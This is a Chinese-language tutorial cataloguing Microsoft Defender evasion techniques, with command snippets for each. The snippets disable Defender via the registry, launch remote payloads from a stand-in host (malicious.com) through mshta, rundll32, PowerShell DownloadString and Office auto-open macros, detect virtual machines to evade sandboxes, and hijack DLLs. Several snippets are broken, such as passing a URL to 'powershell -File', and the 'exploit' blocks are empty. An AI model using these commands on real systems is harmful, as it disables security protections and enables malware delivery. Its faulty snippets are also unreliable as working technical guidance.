Microsoft Defender是Windows系统中的内置防病毒和反恶意软件解决方案。尽管Defender提供了强大的保护功能，但攻击者仍然可以使用各种技术来规避其检测。以下是一些常见的Defender防御规避技术及详细例子：

### 1. 禁用或修改Defender设置

#### 例子：
- **通过注册表禁用Defender**：
  修改注册表键值来禁用Defender。
  ```powershell
  Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1
  ```

- **通过组策略禁用Defender**：
  利用组策略对象（GPO）禁用Defender。
  ```powershell
  Invoke-Expression "gpedit.msc"
  ```

### 2. 使用合法进程和工具

#### 例子：
- **利用mshta.exe**：
  使用合法的mshta.exe进程执行恶意代码。
  ```cmd
  mshta.exe http://malicious.com/malicious.hta
  ```

- **利用rundll32.exe**：
  使用合法的rundll32.exe进程加载和执行恶意DLL。
  ```cmd
  rundll32.exe shell32.dll,ShellExec_RunDLL "http://malicious.com/malicious.dll"
  ```

### 3. 混淆和编码

#### 例子：
- **Base64编码**：
  将恶意代码Base64编码，然后在内存中解码并执行。
  ```powershell
  $encoded = "aW5zdGFsbC1wYWNrYWdlIE5ldC5OZXR3b3Jr"
  $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))
  Invoke-Expression $decoded
  ```

- **字符串混淆**：
  将恶意代码分割成多个部分，然后在运行时拼接执行。
  ```powershell
  $part1 = "Invoke-"
  $part2 = "Expression"
  $command = $part1 + $part2
  Invoke-Expression $command
  ```

### 4. 环境检测和逃避

#### 例子：
- **检测虚拟环境**：
  如果检测到在虚拟环境中运行，则退出或改变行为。
  ```powershell
  if ((Get-WmiObject -Class Win32_ComputerSystem).Manufacturer -eq 'VMware, Inc.') { exit }
  ```

- **延时执行**：
  使用延时执行绕过实时检测。
  ```powershell
  Start-Sleep -Seconds 60
  Invoke-Expression -Command (New-Object Net.WebClient).DownloadString("http://malicious.com/script.ps1")
  ```

### 5. 利用WMI

#### 例子：
- **通过WMI执行代码**：
  使用WMI（Windows Management Instrumentation）执行恶意代码。
  ```powershell
  $wmi = [wmiclass]"\\.\root\cimv2:Win32_Process"
  $wmi.Create("powershell.exe -ExecutionPolicy Bypass -File malicious_script.ps1")
  ```

### 6. 利用脚本解释器

#### 例子：
- **使用cscript或wscript**：
  利用合法的脚本解释器执行恶意代码。
  ```cmd
  cscript.exe malicious_script.vbs
  ```

- **使用PowerShell**：
  通过PowerShell执行恶意代码，绕过Defender的检测。
  ```powershell
  powershell.exe -ExecutionPolicy Bypass -File malicious_script.ps1
  ```

### 7. 文件格式和嵌入

#### 例子：
- **嵌入恶意代码**：
  将恶意代码嵌入到被信任的文件格式中，例如Office文档或PDF。
  ```vbscript
  ' VBA Macro in Excel
  Sub Auto_Open()
      Call Shell("powershell.exe -ExecutionPolicy Bypass -File http://malicious.com/payload.ps1")
  End Sub
  ```

- **使用非典型文件格式**：
  利用非典型或不常见的文件格式执行恶意操作。
  ```cmd
  certutil.exe -decode encoded_payload.txt payload.exe
  ```

### 8. DLL劫持

#### 例子：
- **DLL劫持**：
  攻击者可以将恶意DLL放在目标应用程序的目录中，当应用程序加载DLL时，优先加载恶意DLL。
  ```powershell
  Copy-Item -Path "C:\malicious.dll" -Destination "C:\Program Files\TargetApp\legit.dll"
  ```

### 9. 网络流量隐藏

#### 例子：
- **域前置**：
  使用合法的域名作为前置，隐藏恶意流量。
  ```cmd
  curl -H "Host: legitimate.com" http://malicious.com/payload
  ```

- **使用加密流量**：
  通过加密通信隐藏恶意活动。
  ```powershell
  $client = New-Object System.Net.WebClient
  $client.DownloadString("https://malicious.com/payload")
  ```

### 10. 利用宏和脚本

#### 例子：
- **利用Office宏**：
  利用Office宏执行恶意代码。
  ```vbscript
  ' VBA Macro in Word document
  Sub AutoOpen()
      Call Shell("powershell.exe -ExecutionPolicy Bypass -File http://malicious.com/malicious.ps1")
  End Sub
  ```

- **利用JavaScript**：
  利用浏览器或其他JavaScript运行环境执行恶意代码。
  ```javascript
  var xhr = new XMLHttpRequest();
  xhr.open("GET", "http://malicious.com/payload", true);
  xhr.send();
  ```

### 11. 利用合法软件的漏洞

#### 例子：
- **利用Office漏洞**：
  通过已知的Office漏洞执行恶意代码。
  ```vbscript
  ' Exploit code for a specific Office vulnerability
  ```
  
- **利用浏览器漏洞**：
  通过已知的浏览器漏洞执行恶意代码。
  ```javascript
  // Exploit code for a specific browser vulnerability
  ```

通过这些技术，攻击者可以有效地绕过Microsoft Defender的防御，执行恶意代码。了解这些规避技术对于提升检测和防御能力至关重要。